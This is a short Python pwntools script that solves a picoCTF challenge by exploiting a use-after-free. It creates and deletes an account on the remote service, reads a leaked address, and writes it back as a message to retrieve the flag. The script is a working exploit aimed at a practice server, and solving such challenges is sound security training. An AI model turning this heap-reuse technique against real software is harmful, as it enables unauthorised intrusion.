#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'i386'

r = remote('mercury.picoctf.net', 58574)

# Create account
r.sendline('M')
r.sendline('w3t')

# Delete account
r.sendline('I')
r.sendline('Y')

# Leak address
r.sendline('S')
r.recvuntil('leak...')
leak = int(r.recvline().strip(), 16)
info(f'Leak: {leak:#04x}')

# Leave a message
r.sendline('L')
r.sendline(p32(leak))

success(f'Flag --> {r.recvline_contains(b"pico").strip().decode()}')